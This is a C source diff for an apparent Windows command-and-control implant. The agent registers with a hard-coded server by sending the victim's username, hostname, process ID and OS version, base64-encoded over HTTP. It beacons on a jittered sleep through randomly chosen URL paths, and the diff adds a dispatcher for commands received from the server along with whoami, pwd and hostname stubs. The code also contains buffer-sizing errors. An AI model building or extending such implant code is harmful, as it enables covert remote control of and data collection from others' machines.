@@ -4,6 +4,22 @@
 #include <stdio.h>
 #include <settings.h>
 #include <imports.h>
+#include <paths.h>
+#include <patch.h>
+
+BOOL (*patch_list_pointers[3]) (CHAR **ouput);
+
+BOOL AA$whoami() {
+    printf("whoami");
+}
+
+BOOL AB$pwd() {
+    printf("pwd");
+}
+
+BOOL AC$hostname() {
+    printf("hostname");
+}
 
 BOOL Registration(CHAR **cookie) {
     HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
@@ -14,30 +30,12 @@ BOOL Registration(CHAR **cookie) {
 
     agent.identifier = "register";
 
-
-    CHAR *format = "%s:%s,%s,%d,%d,%s";
-    
-    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
-    sprintf(data_to_encode, format, agent.identifier, job.username, job.hostname, job.process_id, job.version, agent.key);
-
-    CHAR *data_encode = malloc(strlen(data_to_encode));
-    DWORD data_encode_len = strlen(data_to_encode) * 2;
-    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
-
-    DWORD post_buffer_length = strlen(data_encode) + 5;
-    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
-    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);
-
-    CHAR content_length[MAX_PATH];
-    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
-
-
-    DWORD hostname_length = 260;
+    DWORD hostname_length = 256;
     if (myGetComputerNameA(job.hostname, &hostname_length)) {
         printf("Hostname: %s \n", job.hostname);
     }
 
-    DWORD username_buffer = 260;
+    DWORD username_buffer = 256;
     if (GetUserNameA(job.username, &username_buffer)) {
         printf("Username: %s \n", job.username);
     }
@@ -49,6 +47,27 @@ BOOL Registration(CHAR **cookie) {
     if (job.version = myGetVersion()) {
         printf("Host Version: %lu \n", job.version);
     }
+
+    CHAR *format = "%s:%s,%s,%d,%d,%s";
+    
+    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
+    sprintf(data_to_encode, format, agent.identifier, job.username, job.hostname, job.process_id, job.version, agent.key);
+
+    CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode));
+    DWORD data_encode_len = strlen(data_to_encode) * 2;
+    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
+
+    free(data_to_encode);
+
+    DWORD post_buffer_length = strlen(data_encode) + 5;
+    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
+    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);
+
+    free(data_encode);
+
+
+    CHAR content_length[MAX_PATH];
+    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
 
     HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -152,7 +171,9 @@ BOOL Beacon(CHAR  *cookie) {
                     memcpy_s(cmd+offset, buffer_length, temp_buffer, download_buffer);
                     memset(temp_buffer, 0, 8192+1);
                     offset += download_buffer;
-                    printf(cmd);
+                    if (cmd) {
+                        Process(cookie, cmd);
+                    }
                 }
                 free(cmd);
                 if (hRequest) {
@@ -171,6 +192,16 @@ BOOL Beacon(CHAR  *cookie) {
     return TRUE;
 }
 
+BOOL Process(char* cookie, char *cmd) {
+    int length = strlen(cmd);
+    char *alloc = (CHAR*)calloc(length + 1, sizeof(CHAR));
+
+    char *output_1 = (CHAR*)calloc(10, sizeof(CHAR));
+
+    int cmd_int = atoi(cmd);
+    printf("Command: 0x%x\n", cmd_int);
+}
+
 void Sleep_Time() {
     int time = 10;
     int percent = 80;
@@ -179,19 +210,32 @@ void Sleep_Time() {
     Sleep(jitter);
 }
 
+char* Directoryyyyy() {
+    int dir_num = rand() % 5;
+    char* rand_path = paths[dir_num];
+
+    return rand_path;
+}
+
 int main() {
+
     CHAR *cookie = NULL;
     agent.address = "192.168.227.131";
     agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     agent.port = 8080;
-    agent.path = "/about-us";
+    agent.path = Directoryyyyy();
     agent.key = "boondoggle";
+
+    patch_list_pointers[0] = AA$whoami;
+    patch_list_pointers[1] = AB$pwd;
+    patch_list_pointers[2] = AC$hostname;
 
     Registration(&cookie);
     Sleep_Time();
     printf(cookie);
 
     while(TRUE) {
+        agent.path = Directoryyyyy();
         Beacon(cookie);
         Sleep_Time();
     }
